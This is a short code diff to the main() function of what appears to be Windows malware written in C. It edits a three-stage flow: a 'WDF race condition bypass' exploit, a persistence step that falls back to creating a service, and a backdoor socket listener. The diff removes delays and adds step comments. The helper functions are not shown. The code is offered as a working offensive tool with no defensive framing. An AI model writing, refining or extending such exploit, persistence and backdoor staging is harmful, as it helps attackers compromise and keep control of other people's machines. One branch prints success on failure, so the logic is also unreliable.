@@ -20,16 +20,15 @@ int main(void) {
     if (IsAdmin()) {
         printf("[DEBUG] Running as Administrator - Good\n");
         fflush(stdout);
-        Sleep(2000);
     } else {
         printf("[DEBUG] Running as Standard User - Some registry functions may fail\n");
         fflush(stdout);
-        Sleep(2000);
     }
 
     printf("\n--- Stage 1: WDF Race Condition Bypass ---\n");
     fflush(stdout);
 
+    // 3. Run Exploit
     if (!ExecuteExploitLogic()) {
         printf("[EXPLOIT] Stage 1 failed or timed out.\n");
         fflush(stdout);
@@ -44,6 +43,7 @@ int main(void) {
     printf("\n--- Stage 2: Persistence Setup ---\n");
     fflush(stdout);
 
+    // 4. Setup Persistence (NOW works as admin)
     if (!RegisterPersistence()) {
         printf("[PERSIST] Fallback: Created a temporary service.\n");
         fflush(stdout);
@@ -52,6 +52,7 @@ int main(void) {
     printf("\n--- Stage 3: Backdoor Initialization ---\n");
     fflush(stdout);
 
+    // 5. Initialize Backdoor
     if (!StartBackdoor()) {
         printf("[BACKDOOR] Socket listener started.\n");
         fflush(stdout);
